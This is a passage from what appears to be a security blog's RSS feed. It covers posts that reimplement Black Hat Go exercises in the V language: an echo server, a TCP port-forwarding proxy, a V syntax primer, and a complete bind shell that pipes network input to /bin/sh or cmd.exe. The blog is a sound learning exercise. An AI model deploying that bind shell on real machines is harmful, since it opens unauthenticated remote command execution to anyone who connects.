</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// create a buffered reader</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">reader</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">new_buffered_reader</span>(<span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">BufferedReaderConfig</span>{<span style="color:#a6e22e">reader</span>: <span style="color:#a6e22e">conn</span>})
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// create a buffered writer</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">writer</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">new_buffered_writer</span>(<span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">BufferedWriterConfig</span>{<span style="color:#a6e22e">writer</span>: <span style="color:#a6e22e">conn</span>}) <span style="color:#a6e22e">or</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">fatal</span>(<span style="color:#e6db74">&#34;Failed to create buffered writer.&#34;</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// read line with delimiter at new-line.</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">s</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">reader</span>.<span style="color:#a6e22e">read_line</span>(<span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">BufferedReadLineConfig</span>{<span style="color:#a6e22e">delim</span>: <span style="color:#e6db74">`\n`</span>}) <span style="color:#a6e22e">or</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">fatal</span>(<span style="color:#e6db74">&#34;Unable to read data.&#34;</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">info</span>(<span style="color:#e6db74">&#34;Received ${s.len} bytes: ${s}&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">info</span>(<span style="color:#e6db74">&#34;Writing data&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// echo back the data using buffere writer (as per documentatio: write writes src in the buffer, flushing it to the underlying writer as needed, and returns the number of bytes written.)</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">writer</span>.<span style="color:#a6e22e">write</span>(<span style="color:#a6e22e">s</span>.<span style="color:#a6e22e">bytes</span>()) <span style="color:#a6e22e">or</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">fatal</span>(<span style="color:#e6db74">&#34;Unable to write data.&#34;</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><img src="./echo-server-buffered.png" alt="echo-server-buffered"></p>
<p>This can also be achived using <code>io.cp()</code> as it manages buffer and copies for reader to writer i.e. echoes.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#a6e22e">fn</span> <span style="color:#a6e22e">echo</span>(<span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">conn</span> <span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">TcpConn</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">defer</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">conn</span>.close() <span style="color:#a6e22e">or</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">fatal</span>(<span style="color:#e6db74">&#34;Unable to close connection.&#34;</span>)
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">cp</span>(<span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">conn</span>, <span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">conn</span>) <span style="color:#a6e22e">or</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">fatal</span>(<span style="color:#e6db74">&#34;Unable to read/write data.&#34;</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><img src="echo-cp.png" alt="echo-cp"></p>
<h3 id="proxying-a-tcp-client">Proxying a TCP Client</h3>
<p>For this scenario, I configured a linux VM on a shared network interface. Such that the network is as follows:</p>
<ul>
<li>Host Machine: 192.168.1.5 on wlan0</li>
<li>Virtual Machine: 192.168.1.7 on eth0</li>
</ul>
<p>The host machine serves a website on 127.0.0.1:8000</p>
<p><img src="./host-ip-and-server.png" alt="host-ip-and-server"></p>
<p><img src="./vm-ip.png" alt="vm-ip"></p>
<p>Being hosted on loopback interface of the host, this website is not directly accessible to the virtual machine. A port-forward proxy transfer packets from wlan0 host machine to loopback can be of aid in this situation.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#a6e22e">module</span> <span style="color:#a6e22e">main</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> <span style="color:#a6e22e">io</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> <span style="color:#a6e22e">net</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> <span style="color:#a6e22e">log</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fn</span> <span style="color:#a6e22e">handle</span>(<span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">src</span> <span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">TcpConn</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">dst</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">dial_tcp</span>(<span style="color:#e6db74">&#34;127.0.0.1:8000&#34;</span>) <span style="color:#a6e22e">or</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">fatal</span>(<span style="color:#e6db74">&#34;Unable to connect to 127.0.0.1:8000&#34;</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">defer</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">dst</span>.close() <span style="color:#a6e22e">or</span> {
</span></span><span style="display:flex;"><span>			
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">go</span> <span style="color:#a6e22e">fn</span> [<span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">src</span>, <span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">dst</span>] () {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">cp</span>(<span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">src</span>, <span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">dst</span>) <span style="color:#a6e22e">or</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">fatal</span>(<span style="color:#e6db74">&#34;Unable to write to 127.0.0.1:8000&#34;</span>)
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">cp</span>(<span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">dst</span>, <span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">src</span>) <span style="color:#a6e22e">or</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">fatal</span>(<span style="color:#e6db74">&#34;Unable to write to 192.168.1.5:8080&#34;</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fn</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">listener</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">listen_tcp</span>(<span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">AddrFamily</span>.<span style="color:#a6e22e">ip</span>, <span style="color:#e6db74">&#34;192.168.1.5:8080&#34;</span>) <span style="color:#a6e22e">or</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">fatal</span>(<span style="color:#e6db74">&#34;Failed to start a TCP server on port 192.168.1.5:8080.&#34;</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">conn</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">listener</span>.<span style="color:#a6e22e">accept</span>() <span style="color:#a6e22e">or</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">fatal</span>(<span style="color:#e6db74">&#34;Unable to accept connections.&#34;</span>)
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">go</span> <span style="color:#a6e22e">handle</span>(<span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">conn</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Running it opens up port 8080 (http-alt) on 192.168.1.5</p>
<p><img src="./http-alt-open.png" alt="http-alt-open"></p>
<p>A <code>curl</code> from within the virtual machine demonstrates how the request is proxied to 127.0.0.1:8000.</p>
<p><img src="./proxied-req.png" alt="proxied-req"></p>
<h3 id="replicating-netcat-for-command-execution">Replicating Netcat for Command Execution</h3>
<p>The <a href="https://modules.vlang.io/os.html#Process"><code>os.Process</code></a> struct can be used to execute processes. In following code, I launch an instance of <code>/bin/sh</code>. Through an infinite <code>for</code> loop, I process the input and return the output back to the client using buffered reader and writer (discussed above).</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#a6e22e">module</span> <span style="color:#a6e22e">main</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> <span style="color:#a6e22e">os</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> <span style="color:#a6e22e">io</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> <span style="color:#a6e22e">net</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> <span style="color:#a6e22e">log</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fn</span> <span style="color:#a6e22e">handle</span>(<span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">conn</span> <span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">TcpConn</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Create buffered streams from the connection</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">reader</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">new_buffered_reader</span>(<span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">BufferedReaderConfig</span>{<span style="color:#a6e22e">reader</span>: <span style="color:#a6e22e">conn</span>})
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">writer</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">new_buffered_writer</span>(<span style="color:#a6e22e">io</span>.<span style="color:#a6e22e">BufferedWriterConfig</span>{<span style="color:#a6e22e">writer</span>: <span style="color:#a6e22e">conn</span>}) <span style="color:#a6e22e">or</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">fatal</span>(<span style="color:#e6db74">&#34;Failed to create buffered writer.&#34;</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Create a new &#39;/bin/sh -i&#39; process</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">proc</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">Process</span>{
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">filename</span>: <span style="color:#e6db74">&#34;/bin/sh&#34;</span>,
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">defer</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">proc</span>.close()
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">conn</span>.close() <span style="color:#a6e22e">or</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">log</span>.error(<span style="color:#e6db74">&#34;Unable to close connection.&#34;</span>)
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Enable redirect for stdin/stdout/stderr</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">proc</span>.<span style="color:#a6e22e">set_redirect_stdio</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Start the process</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">proc</span>.<span style="color:#a6e22e">run</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// read-exec-return loop</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// read input from client</span>
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">input</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">reader</span>.<span style="color:#a6e22e">read_line</span>() <span style="color:#a6e22e">or</span> { 
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">log</span>.error(<span style="color:#e6db74">&#34;Unable to read command. Client possibly disconnected.&#34;</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// provide input to the process</span>
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">proc</span>.<span style="color:#a6e22e">stdin_write</span>(
</span></span><span style="display:flex;"><span>			<span style="color:#75715e">// handle edge-case where blank input breaks /bin/sh</span>
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">input</span>.<span style="color:#a6e22e">len</span> <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span> {<span style="color:#a6e22e">input</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;\n&#39;</span>} <span style="color:#66d9ef">else</span> { <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">echo</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#a6e22e">n</span><span style="color:#960050;background-color:#1e0010">&#39;</span> }
</span></span><span style="display:flex;"><span>		)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// fetch back the result</span>
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">writer</span>.<span style="color:#a6e22e">write</span>(<span style="color:#a6e22e">proc</span>.<span style="color:#a6e22e">stdout_read</span>().<span style="color:#a6e22e">bytes</span>()) <span style="color:#a6e22e">or</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">log</span>.error(<span style="color:#e6db74">&#34;Unable to fetch output&#34;</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#75715e">// flush the result to client</span>
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">writer</span>.<span style="color:#a6e22e">flush</span>() <span style="color:#a6e22e">or</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">log</span>.error(<span style="color:#e6db74">&#34;Unable to send output&#34;</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fn</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">use_stdout</span>()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">host</span> <span style="color:#f92672">:=</span> <span style="color:#e6db74">&#34;0.0.0.0&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">port</span> <span style="color:#f92672">:=</span> <span style="color:#ae81ff">20080</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">listener</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">listen_tcp</span>(<span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">AddrFamily</span>.<span style="color:#a6e22e">ip</span>, <span style="color:#e6db74">&#34;${host}:${port}&#34;</span>) <span style="color:#a6e22e">or</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">fatal</span>(<span style="color:#e6db74">&#34;Failed to spawn a listener.&#34;</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">info</span>(<span style="color:#e6db74">&#34;Started listener on ${host}:${port}&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">conn</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">listener</span>.<span style="color:#a6e22e">accept</span>() <span style="color:#a6e22e">or</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">fatal</span>(<span style="color:#e6db74">&#34;Failed to accept connections.&#34;</span>)
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">go</span> <span style="color:#a6e22e">handle</span>(<span style="color:#a6e22e">mut</span> <span style="color:#a6e22e">conn</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><img src="./cmd-exec.png" alt="cmd-exec"></p>
<p>Swapping the process filename from <code>/bin/sh</code> to <code>c:\\windows\\system32\\cmd.exe</code> and cross-compiling for Microsoft Windows allowed the bind-shell to work on a different OS with minimal effor.</p>
<p><img src="./cmd-exec-win.png" alt="cmd-exec-win"></p>
<h2 id="meme-time">Meme Time</h2>
<p><img src="./meme-my-echo-server.png" alt="meme-my-echo-server"></p>
]]></description>
      
    </item>
    
    
    
    <item>
      <title>Black Hat V: Introduction to something that I might or might not do</title>
      <link>https://ashtrace.github.io/posts/black_hat_v_intro/</link>
      <pubDate>Sun, 30 Nov 2025 11:19:42 +0530</pubDate>
      
      <guid>https://ashtrace.github.io/posts/black_hat_v_intro/</guid>
      <description><![CDATA[<p>After brothing my first set of cybersecurity alphabet soup of certifications (yup, now I&rsquo;ve hunt down OSCP for my HR peeps) I felt need to re-strategise my academic approach. Following is the first of many advents I have planned for myself. Throughout this and following posts (marked as Black Hat V), I&rsquo;d try to reconstruct the exercises of <a href="https://nostarch.com/blackhatgo">Black Hat Go (by Tom Steele, Chris Patten, and Dan Kottmann)</a> to encourage myself to learn <a href="https://vlang.io/">vlang</a>.</p>
<h2 id="setting-up-a-development-environment">Setting Up a Development Environment</h2>
<h3 id="downloading-and-installing-v">Downloading and Installing V</h3>
<p>Visit <a href="https://vlang.io/">vlang.io</a> and download for your OS. (I&rsquo;d be using linux througout this series, if Microsoft Windows is need I&rsquo;d leverage a VM).</p>
<p><img src="./download-vlang.png" alt="download-vlang"></p>
<p>Extract the zip archive downloaded. This would create a <code>v</code> directory with following contents. <code>./v</code> can be used to launch a REPL shell or compile/run <code>.v</code> source file.</p>
<p><img src="./v-files.png" alt="v-files"></p>
<blockquote>
<p>It is highly recommended, that you put V on your PATH. That saves you the effort to type in the full path to your v executable every time. V provides a convenience <code>v symlink</code> command to do that more easily.</p>
</blockquote>
<p>On Unix systems, it creates a <code>/usr/local/bin/v</code> symlink to your executable. To do that, run:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>sudo ./v symlink
</span></span></code></pre></div><h3 id="choosing-an-ide">Choosing an IDE</h3>
<p>I configured <a href="https://code.visualstudio.com/">Microsoft Visual Studio Code</a> with extension for Vlang.</p>
<p><img src="./vscode-v.png" alt="vscode-v"></p>
<h2 id="breaking-ice-with-v-tool-commands">Breaking Ice with V tool commands</h2>
<h3 id="the-v-run-command">The <code>v run</code> command</h3>
<p>Create a source file with .v extension (let&rsquo;s say hello.v), with following code.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#a6e22e">fn</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>	println(<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">hello</span> <span style="color:#a6e22e">world</span><span style="color:#960050;background-color:#1e0010">&#39;</span>)
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>From the command line, execute <code>v run hello.v</code>, you&rsquo;d see the message printed back on screen.</p>
<p><img src="./v-hello-world.png" alt="v-hello-world"></p>
<p>Similar to golang, <code>v run</code> does not produce a compiled executable. To create a binary file just remove the <code>run</code> from the command.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>v hello.v
</span></span></code></pre></div><p>This should create an executable (ELF on linux, EXE on windows) with same name as the source code file.</p>
<p><img src="./v-compile-binary.png" alt="v-compile-binary"></p>
<p>To enable production mode optimizations while building, use <code>-prod</code> flag. This also helps to reduce the executable file size.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>v hello.v -prod
</span></span></code></pre></div><p><img src="./v-prod-build.png" alt="v-prod-build"></p>
<h3 id="cross-compilation">Cross-Compilation</h3>
<p>To cross-compile the file, just pass the target OS using <code>-os</code> flag.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>v hello.v -os windows
</span></span></code></pre></div><p><img src="./v-cross-compilation.png" alt="v-cross-compilation"></p>
<h3 id="the-v-install-command">The <code>v install</code> command</h3>
<p>To fetch third-party packages, use the <code>v install</code> command.</p>
<p><img src="./v-install.png" alt="v-install"></p>
<h3 id="the-v-fmt-command">The <code>v fmt</code> command</h3>
<p>You don&rsquo;t need to worry about formatting your code or setting style guidelines. v fmt takes care of that:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>v fmt file.v
</span></span></code></pre></div><h3 id="v-playground">V Playground</h3>
<p>It is an execution environment that provides a web-based interface to play with the language. Try it <a href="https://play.vlang.io/">here</a>.</p>
<h2 id="the-v-syntax">The V Syntax</h2>
<p>For a thorough study of the language you can refer to <a href="https://docs.vlang.io/introduction.html">V Documentation</a>. Following is a brief overview of the syntax.</p>
<h3 id="data-types">Data Types</h3>
<h4 id="primitive-data-types">Primitive Data Types</h4>
<p>The primitive data types include</p>
<ul>
<li>bool</li>
<li>string</li>
<li>i8, i16, int, i64</li>
<li>u8, u16, u32, u64</li>
<li>rune (represents a single UTF-32 encoded Unicode character and is an alias for <code>u32</code>. To denote them, use <strong>`</strong> (backticks) )</li>
<li>f32, f64</li>
<li>isize, usize (platform dependent, the size of bytes it takes to reference any location in memory)</li>
<li>voidptr (for interoperability with C)</li>
</ul>
<blockquote>
<p>Unlike C and Go, <code>int</code> is always a <strong>32 bit integer</strong>.</p>
</blockquote>
<p>There is an exception to the rule that all operators in V must have values of the same type on both sides. A small primitive type on one side can be automatically promoted if it fits completely into the data range of the type on the other side. These are the allowed possibilities:</p>
<pre tabindex="0"><code>   i8 → i16 → int → i64
                  ↘     ↘
                    f32 → f64
                  ↗     ↗
   u8 → u16 → u32 → u64 ⬎
      ↘     ↘     ↘      ptr
   i8 → i16 → int → i64 ⬏
</code></pre><p>An int value for example can be automatically promoted to f64 or i64 but not to u32. (u32 would mean loss of the sign for negative values). Promotion from int to f32, however, is currently done automatically (but can lead to precision loss for large values).</p>
<p>Literals like 123 or 4.56 are treated in a special way. They do not lead to type promotions, however they default to int and f64 respectively, when their type has to be decided.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#a6e22e">u</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">u16</span>(<span style="color:#ae81ff">12</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">v</span> <span style="color:#f92672">:=</span> <span style="color:#ae81ff">13</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">u</span>    <span style="color:#75715e">// v is of type `u16` - no promotion</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">x</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">f32</span>(<span style="color:#ae81ff">45.6</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">y</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">x</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">3.14</span>  <span style="color:#75715e">// y is of type `f32` - no promotion</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">a</span> <span style="color:#f92672">:=</span> <span style="color:#ae81ff">75</span>        <span style="color:#75715e">// a is of type `int` - default for int literal</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">b</span> <span style="color:#f92672">:=</span> <span style="color:#ae81ff">14.7</span>      <span style="color:#75715e">// b is of type `f64` - default for float literal</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">c</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">u</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">a</span>     <span style="color:#75715e">// c is of type `int` - automatic promotion of `u`&#39;s value</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">d</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">b</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">x</span>     <span style="color:#75715e">// d is of type `f64` - automatic promotion of `x`&#39;s value</span>
</span></span></code></pre></div><h4 id="strings">Strings</h4>
<p>In V, strings are encoded in UTF-8, and are immutable (read-only) by default.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#a6e22e">s</span> <span style="color:#f92672">:=</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">hello</span> <span style="color:#960050;background-color:#1e0010">🌎&#39;</span> <span style="color:#75715e">// the `world` emoji takes 4 bytes, and string length is reported in bytes</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">assert</span> <span style="color:#a6e22e">s</span>.<span style="color:#a6e22e">len</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">10</span>
</span></span><span style="display:flex;"><span>
